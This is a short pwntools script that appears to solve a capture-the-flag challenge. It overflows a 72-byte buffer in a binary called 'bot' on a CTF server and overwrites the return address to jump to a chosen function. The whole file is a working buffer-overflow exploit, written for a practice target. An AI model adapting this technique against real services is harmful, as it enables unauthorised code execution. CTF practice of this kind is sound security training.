#!/usr/bin/env python3

from pwn import *

exe = ELF("./bot")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

target = 0x40129a

# r = process([exe.path])
r = remote("lac.tf", 31180)

r.sendline(b"give me the flag".ljust(72, b"\0") + pack(target))

r.interactive()
